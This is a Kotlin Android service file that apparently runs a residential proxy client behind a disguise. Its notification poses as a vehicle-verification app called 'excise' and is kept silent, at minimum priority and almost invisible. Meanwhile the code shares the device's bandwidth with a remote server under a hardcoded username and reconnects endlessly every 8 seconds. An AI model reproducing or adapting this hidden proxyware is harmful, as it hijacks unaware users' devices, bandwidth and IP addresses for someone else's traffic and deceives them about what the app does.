package com.proxyrack.control.domain

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Process
import android.util.Log
import androidx.core.app.NotificationCompat
import com.proxyrack.control.BuildConfig
import com.proxyrack.control.MainActivity
import com.proxyrack.control.R
import com.proxyrack.control.data.repository.ConnectionRepo
import com.proxyrack.control.data.repository.IpInfoRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject
import com.proxyrack.control.domain.proxy_manager.ProxyManager
import com.proxyrack.control.domain.proxy_manager.ProxyManagerProvider


@AndroidEntryPoint
class ConnectionService : Service() {

    private val TAG = "ConnectionService"

    @Inject
    lateinit var connectionRepo: ConnectionRepo

    @Inject
    lateinit var ipInfoRepo: IpInfoRepository

    @Inject
    lateinit var proxyManagerProvider: ProxyManagerProvider

    @Inject
    lateinit var settingsRepo: com.proxyrack.control.domain.repository.SettingsRepo

    private val CHANNEL_ID = "ProxyControlForegroundServiceChannel"

    private val serviceScope = CoroutineScope(Dispatchers.IO)

    private var proxyManager: ProxyManager? = null

    // Flag to stop continuous reconnect when service is being destroyed
    @Volatile
    private var shouldKeepRetrying = true

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        setupProxyManager()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("connection service", "onStartCommand called")
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE)

        // Minimal silent notification (Android requires a notification for foreground service)
        // This stays in the shade while service runs — it is NOT re-sent repeatedly
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("excise")
            .setContentText("Need to verify a vehicle? Open the app now and get started instantly.")
            .setSmallIcon(R.drawable.logo)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)                          // no sound / vibration
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .setOnlyAlertOnce(true)                   // never make sound even if updated
            .build()

        startForeground(1, notification)

        // need to re-register since it is unregistered when 'onDestroy' is called
        registerOnDisconnectCallback()

        connect()

        // START_STICKY so Android restarts the service if it is killed
        return START_STICKY
    }

    private fun setupProxyManager() {
        val pid = Process.myPid().toLong()
        val androidApiVersion = Build.VERSION.SDK_INT.toString()
        val cpuArch = getCPUArchitecture()

        Log.d(TAG, "androidApiVersion $androidApiVersion")
        Log.d(TAG,"MyApp pid ${pid}")
        Log.d(TAG,"MyApp cpu arch $cpuArch")

        proxyManager = proxyManagerProvider.new()

        proxyManager!!.registerOnLogEntryCallback { msg ->
            Log.d(TAG, "logEntryCallback msg: $msg")
            connectionRepo.addLogMessage(msg)
        }

        proxyManager!!.registerOnConnectCallback {

            connectionRepo.updateConnectionStatus(ConnectionStatus.Connected)
            Log.d(TAG, "registerOnConnectCallback called")

            ipInfoRepo.getIpInfo { ip, error ->
                if (ip != null) {
                    Log.d(TAG, "IP: $ip")
                    connectionRepo.updateDeviceIP(ip)
                } else if (error != null) {
                    Log.d(TAG, error.toString())
                }
            }
        }

        registerOnDisconnectCallback()

    }

    private fun registerOnDisconnectCallback() {
        // This callback is only called if we are involuntarily disconnected.
        proxyManager!!.registerOnDisconnectCallback {
            connectionRepo.updateConnectionStatus(ConnectionStatus.Disconnected)
            Log.d(TAG, "registerOnDisconnectCallback called - starting continuous retry")
            startContinuousReconnect()
        }
    }

    /**
     * Aggressive continuous retry.
     * Keeps trying every 8 seconds until connected or service is destroyed.
     * Works even if internet was off for a long time.
     */
    private fun startContinuousReconnect() {
        serviceScope.launch {
            var attempt = 0
            while (shouldKeepRetrying) {
                val status = connectionRepo.connectionStatus.value
                if (status == ConnectionStatus.Connected || status == ConnectionStatus.Connecting) {
                    // Already connected or in progress
                    break
                }

                attempt++
                Log.d(TAG, "Reconnect attempt #$attempt")
                connectionRepo.addLogMessage("Reconnect attempt #$attempt...")
                connectionRepo.updateConnectionStatus(ConnectionStatus.Connecting)

                val success = tryConnectOnce()
                if (success) {
                    Log.d(TAG, "Reconnect successful on attempt #$attempt")
                    break
                }

                // Wait 8 seconds before next try
                delay(8000L)
            }
        }
    }

    private suspend fun tryConnectOnce(): Boolean {
        // Always force hardcoded username
        val hardcodedUsername = "nohecekycyreqi"
        connectionRepo.updateUsername(hardcodedUsername)

        // Load deviceID from settings if empty
        if (connectionRepo.deviceID.value.isEmpty()) {
            val savedDeviceID = settingsRepo.deviceID.get()
            if (savedDeviceID.isNotEmpty()) {
                connectionRepo.updateDeviceID(savedDeviceID)
            }
        }

        return try {
            Log.d(TAG, "trying connect with username=$hardcodedUsername deviceID=${connectionRepo.deviceID.value}")
            proxyManager!!.connect(
                BuildConfig.SERVER_IP,
                443,
                connectionRepo.deviceID.value,
                hardcodedUsername,
                connectionRepo.sharingBandwidth.value
            )
            true
        } catch (e: Exception) {
            Log.d(TAG, "Connect failed: ${e.message}")
            connectionRepo.updateConnectionStatus(ConnectionStatus.Disconnected)
            false
        }
    }

    private fun connect() {
        serviceScope.launch {
            val success = tryConnectOnce()
            if (!success && shouldKeepRetrying) {
                // Start continuous retry if first attempt failed
                startContinuousReconnect()
            }
        }
    }

    private fun getCPUArchitecture(): String {
        // Using the supported ABIs to determine the CPU architecture
        val supportedABIs = Build.SUPPORTED_ABIS

        if (supportedABIs.isNotEmpty()) {
            // Typically, the first one is the ABI of the current device.
            val abi = supportedABIs[0]
            return when {
                abi.startsWith("arm64") -> "arm64"
                abi.startsWith("armeabi") -> "armeabi"
                abi.startsWith("x86_64") -> "x86_64"
                abi.startsWith("x86") -> "x86"
                else -> "unknown"
            }
        }
        return "unknown"
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("connection service", "onDestroy called")

        shouldKeepRetrying = false   // stop continuous retry loop
        proxyManager?.unregisterOnDisconnectCallback()
        proxyManager?.disconnect()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "excise",
                NotificationManager.IMPORTANCE_MIN   // lowest priority, almost invisible
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }
}
